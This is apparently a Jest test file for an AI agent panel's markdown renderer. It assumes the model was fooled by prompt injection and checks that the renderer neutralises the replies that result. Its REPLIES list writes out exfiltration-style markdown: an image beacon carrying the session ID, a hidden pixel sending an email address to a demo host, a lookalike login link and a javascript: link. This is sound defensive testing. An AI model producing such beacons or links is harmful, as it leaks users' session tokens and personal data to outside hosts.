/**
 * J-02 · c-calhk-agent-panel (markdown renderer) · A-313, A-201, A-216, A-204
 * Defence in depth: assume the model was fooled and test that the panel limits damage.
 */
import { createElement } from 'lwc';
import CalhkAgentPanel from 'c/calhkAgentPanel';
import { TRUSTED_HOSTS } from 'c/calhkAllowlist';

jest.mock('@salesforce/apex/CalHK_AgentContextController.forwardContext', () => ({ default: jest.fn(() => Promise.resolve('queued')) }), { virtual: true });
jest.mock('@salesforce/apex/CalHK_AgentContextController.requestRefund', () => ({ default: jest.fn(() => Promise.resolve('pending-approval')) }), { virtual: true });

const { untrusted } = require('calhack/lib/cases');
const { flushPromises, activeMarkup } = require('calhack/lib/dom');

// What a fooled model might echo back: the attack payloads rewritten as replies.
const REPLIES = [
    ['A-201 image beacon', `Summary: invoice PDF will not open. ${untrusted('A-201').match(/!\[[^\]]*\]\([^)]*\)/)[0]} Demo Contact 555-0100`],
    ['A-216 session badge', 'Weekly status: on track. ![ok](https://status.demo.example/b.png?s={!$Api.Session_ID})'],
    ['A-313 hidden pixel', 'Summary done. ![ ](https://img.demo.example/p.gif?d=demo.contact@demo.example)'],
    ['A-204 lookalike login', `Try this: ${untrusted('A-204').match(/\[[^\]]+\]\([^)]*\)/)[0]}`],
    ['script-scheme link', `Open [logs](${['javascript', 'window.__calhackMarker=1'].join(':')})`]
];

function mount(reply) {
    const el = createElement('c-calhk-agent-panel', { is: CalhkAgentPanel });
    el.reply = reply;
    document.body.appendChild(el);
    return el;
}

const hostOf = (u) => {
    try {
        return new URL(u).hostname;
    } catch {
        return null;
    }
};

describe('J-02 c-calhk-agent-panel reply rendering', () => {
    afterEach(() => {
        while (document.body.firstChild) document.body.removeChild(document.body.firstChild);
        delete window.__calhackMarker;
    });

    it.each(REPLIES)('%s: no off-allowlist image loads and every link shows its real host', async (_label, reply) => {
        const el = mount(reply);
        await flushPromises();
        const root = el.shadowRoot;

        root.querySelectorAll('img').forEach((img) => {
            expect(TRUSTED_HOSTS).toContain(hostOf(img.getAttribute('src')));
        });
        root.querySelectorAll('a').forEach((a) => {
            const host = hostOf(a.getAttribute('href'));
            expect(TRUSTED_HOSTS).toContain(host);
            expect(a.parentElement.textContent).toContain(host);
        });
        expect(activeMarkup(root)).toEqual([]);

        // Off-domain targets stay visible as text so the user can see where they point.
        const targets = [...reply.matchAll(/\]\(([^)\s]*)\)/g)].map((m) => hostOf(m[1])).filter(Boolean);
        targets
            .filter((h) => !TRUSTED_HOSTS.includes(h))
            .forEach((h) => expect(root.querySelector('.reply').textContent).toMatch(new RegExp(h.split('.').slice(-2).join('\\.'))));
    });

    it('shows merge-field syntax as literal text', async () => {
        const el = mount('Your session: {!$Api.Session_ID}');
        await flushPromises();
        expect(el.shadowRoot.querySelector('.reply').textContent).toContain('{!$Api.Session_ID}');
    });

    it('still renders trusted images and links (no over-blocking)', async () => {
        const el = mount('Logo ![logo](https://docs.calhk-demo.example/logo.png) and [docs](https://docs.calhk-demo.example/help)');
        await flushPromises();
        expect(el.shadowRoot.querySelectorAll('img').length).toBe(1);
        expect(el.shadowRoot.querySelectorAll('a').length).toBe(1);
        expect(el.shadowRoot.querySelector('.host').textContent).toContain('docs.calhk-demo.example');
    });
});
